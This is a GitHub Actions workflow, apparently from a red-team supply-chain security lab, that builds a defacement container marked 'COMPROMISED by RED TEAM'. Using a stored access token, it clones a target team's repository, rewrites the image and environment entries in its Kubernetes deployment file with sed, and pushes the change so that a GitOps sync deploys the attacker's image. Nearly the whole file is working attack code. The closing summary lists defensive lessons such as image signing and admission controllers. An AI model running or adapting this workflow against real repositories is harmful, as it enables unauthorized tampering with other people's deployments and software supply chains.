name: "Color Change Attack"

on:
  workflow_dispatch:
    inputs:
      target_team:
        description: 'Target team (blue/green)'
        required: true
        default: 'blue'
        type: choice
        options:
          - blue
          - green
      target_color:
        description: 'Change color to'
        required: true
        default: 'red'
        type: choice
        options:
          - red

permissions:
  contents: write
  id-token: write
  packages: write

jobs:
  color_attack:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup target repository
        id: setup
        run: |
          case "${{ github.event.inputs.target_team }}" in
            "blue")
              echo "target_repo=slsa-lab-blue/application" >> $GITHUB_OUTPUT
              echo "target_image=ghcr.io/slsa-lab-blue/application" >> $GITHUB_OUTPUT
              echo "attack_image=ghcr.io/slsa-lab-red/application" >> $GITHUB_OUTPUT
              echo "deployment_file=k8s/deployment.yaml" >> $GITHUB_OUTPUT
              ;;
            "green")
              echo "target_repo=slsa-lab-green/application" >> $GITHUB_OUTPUT
              echo "target_image=ghcr.io/slsa-lab-green/application" >> $GITHUB_OUTPUT
              echo "attack_image=ghcr.io/slsa-lab-red/application" >> $GITHUB_OUTPUT
              echo "deployment_file=k8s/deployment-recovery.yaml" >> $GITHUB_OUTPUT
              ;;
          esac

      - name: Set up buildx
        uses: docker/setup-buildx-action@v3

      - name: Login to GHCR
        uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.G_TOKEN }}

      - name: Create color-changed image
        run: |
          cat > Dockerfile.color << 'EOF'
          FROM nginx:alpine
          
          # 색상 변경된 웹 페이지 생성
          RUN echo '<!DOCTYPE html>' > /usr/share/nginx/html/index.html && \
              echo '<html><head><title>Compromised by Red Team</title></head>' >> /usr/share/nginx/html/index.html && \
              echo '<body style="background-color: ${{ github.event.inputs.target_color }}; color: white; text-align: center; padding-top: 200px;">' >> /usr/share/nginx/html/index.html && \
              echo '<h1>🚨 COMPROMISED by RED TEAM 🚨</h1>' >> /usr/share/nginx/html/index.html && \
              echo '<h2>Color changed to: ${{ github.event.inputs.target_color }}</h2>' >> /usr/share/nginx/html/index.html && \
              echo '<p>Original team: ${{ github.event.inputs.target_team }}</p>' >> /usr/share/nginx/html/index.html && \
              echo '<p>Attack time: '$(date)' </p>' >> /usr/share/nginx/html/index.html && \
              echo '</body></html>' >> /usr/share/nginx/html/index.html
          
          EXPOSE 80
          CMD ["nginx", "-g", "daemon off;"]
          EOF

      - name: Build and push color-changed image
        uses: docker/build-push-action@v6
        id: build
        with:
          context: .
          file: Dockerfile.color
          push: true
          tags: |
            ${{ steps.setup.outputs.attack_image }}:${{ github.event.inputs.target_color }}-attack
            ${{ steps.setup.outputs.attack_image }}:compromised-${{ github.sha }}
            ${{ steps.setup.outputs.attack_image }}:latest
          build-args: |
            TEAM=red-team-attack
            COLOR=${{ github.event.inputs.target_color }}

      - name: Clone target repository
        env:
          GH_TOKEN: ${{ secrets.G_TOKEN }}
        run: |
          git clone https://${{ secrets.G_TOKEN }}@github.com/${{ steps.setup.outputs.target_repo }}.git target_repo
          cd target_repo
          git config user.name "red-team-attack"
          git config user.email "attack@red-team.com"
          git remote set-url origin https://${{ secrets.G_TOKEN }}@github.com/${{ steps.setup.outputs.target_repo }}.git

      - name: Modify deployment with new color image
        env:
          GH_TOKEN: ${{ secrets.G_TOKEN }}
        run: |
          cd target_repo
          
          echo "🎯 Starting deployment modification attack..."
          echo "Target team: ${{ github.event.inputs.target_team }}"
          echo "Attack image: ${{ steps.setup.outputs.attack_image }}:${{ github.event.inputs.target_color }}-attack"
          
          # Blue Team 공격 - deployment.yaml 수정
          if [ "${{ github.event.inputs.target_team }}" == "blue" ]; then
            echo "🔵 Attacking Blue Team deployment..."
            
            # 기존 이미지 백업
            grep "image:" k8s/deployment.yaml > /tmp/original_image.txt || true
            echo "Original image: $(cat /tmp/original_image.txt)"
            
            # 우리의 악성 이미지로 교체
            sed -i "s|image: .*|image: ${{ steps.setup.outputs.attack_image }}:${{ github.event.inputs.target_color }}-attack|" k8s/deployment.yaml
            
            # 색상 환경변수 주입
            if ! grep -q "TEAM_COLOR" k8s/deployment.yaml; then
              sed -i '/ports:/i\
                  env:\
                    - name: TEAM_COLOR\
                      value: "${{ github.event.inputs.target_color }}"\
                    - name: ATTACK_STATUS\
                      value: "COMPROMISED_BY_RED_TEAM"' k8s/deployment.yaml
            else
              sed -i "s|value: .*|value: \"${{ github.event.inputs.target_color }}\"|" k8s/deployment.yaml
            fi
            
            echo "✅ Blue Team deployment.yaml modified successfully"
          fi
          
          # Green Team 공격 - deployment-recovery.yaml 수정
          if [ "${{ github.event.inputs.target_team }}" == "green" ]; then
            echo "🟢 Attacking Green Team deployment..."
            
            # 기존 이미지 백업
            grep "image:" k8s/deployment-recovery.yaml > /tmp/original_image.txt || true
            echo "Original image: $(cat /tmp/original_image.txt)"
            
            # 우리의 악성 이미지로 교체
            sed -i "s|image: .*|image: ${{ steps.setup.outputs.attack_image }}:${{ github.event.inputs.target_color }}-attack|" k8s/deployment-recovery.yaml
            
            # 보안 컨텍스트는 유지하되 환경변수 추가
            if ! grep -q "TEAM_COLOR" k8s/deployment-recovery.yaml; then
              sed -i '/ports:/i\
                  env:\
                    - name: TEAM_COLOR\
                      value: "${{ github.event.inputs.target_color }}"\
                    - name: ATTACK_STATUS\
                      value: "COMPROMISED_BY_RED_TEAM"\
                    - name: ORIGINAL_TEAM\
                      value: "green"' k8s/deployment-recovery.yaml
            else
              sed -i "s|value: .*|value: \"${{ github.event.inputs.target_color }}\"|" k8s/deployment-recovery.yaml
            fi
            
            echo "✅ Green Team deployment-recovery.yaml modified successfully"
          fi
          
          # 변경사항 확인
          echo "🔍 Deployment changes:"
          git diff
          
          echo "📋 Modified files:"
          git status --porcelain
          
          # 변경사항이 있을 때만 커밋
          if [ -n "$(git status --porcelain)" ]; then
            git add .
            git commit -m "🚨 SUPPLY CHAIN ATTACK: ${{ github.event.inputs.target_team }} team compromised by Red Team - Color changed to ${{ github.event.inputs.target_color }}"
            
            echo "🚀 Pushing attack to target repository..."
            # 재시도 로직으로 안전하게 push
            for i in {1..3}; do
              if git push; then
                echo "✅ Successfully pushed attack changes on attempt $i"
                echo "🎯 Target team deployment now uses our malicious image!"
                break
              else
                echo "❌ Push failed on attempt $i, retrying..."
                sleep 2
              fi
            done
          else
            echo "⚠️ No changes detected to commit"
          fi

      - name: Attack summary
        run: |
          echo "🎯 SUPPLY CHAIN ATTACK COMPLETED!"
          echo "================================="
          echo "Target Team: ${{ github.event.inputs.target_team }}"
          echo "Color Changed To: ${{ github.event.inputs.target_color }}"
          echo "Attack Image: ${{ steps.setup.outputs.attack_image }}:${{ github.event.inputs.target_color }}-attack"
          echo "Target Repository: ${{ steps.setup.outputs.target_repo }}"
          echo ""
          echo "🚨 CRITICAL: Target team deployment now uses OUR malicious image!"
          echo ""
          echo "✅ Attack Vector: GitOps Supply Chain Compromise"
          echo "✅ Method: Direct Repository Deployment Modification"
          echo "✅ Result: Enemy team will deploy our compromised container!"
          echo ""
          echo "🔍 When the target team syncs their ArgoCD:"
          echo "   - Their pods will restart with our image"
          echo "   - Background color will change to: ${{ github.event.inputs.target_color }}"
          echo "   - Message: 'COMPROMISED by RED TEAM' will be displayed"
          echo "   - Their original application is completely replaced"
          echo ""
          echo "⚠️  This demonstrates a critical supply chain vulnerability!"
          echo "📋 Target team needs to:"
          echo "   1. Check their deployment files immediately"
          echo "   2. Verify image signatures"
          echo "   3. Implement admission controllers"
          echo "   4. Monitor for unauthorized repository changes"